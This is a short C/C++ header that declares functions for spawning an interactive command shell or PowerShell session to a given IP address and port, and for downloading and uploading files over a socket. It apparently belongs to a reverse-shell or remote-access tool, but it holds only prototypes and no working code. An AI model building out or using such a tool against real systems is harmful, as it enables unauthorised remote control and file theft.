#pragma once
#include "stdafx.h"

int spawnInteractiveShell(char* ip_addr, int port);
int spawnInteractivePowerShell(char* ip_addr, int port);
int downloadFile(SOCKET sock, char* fichero);
int uploadFile(SOCKET sock, char* fichero);
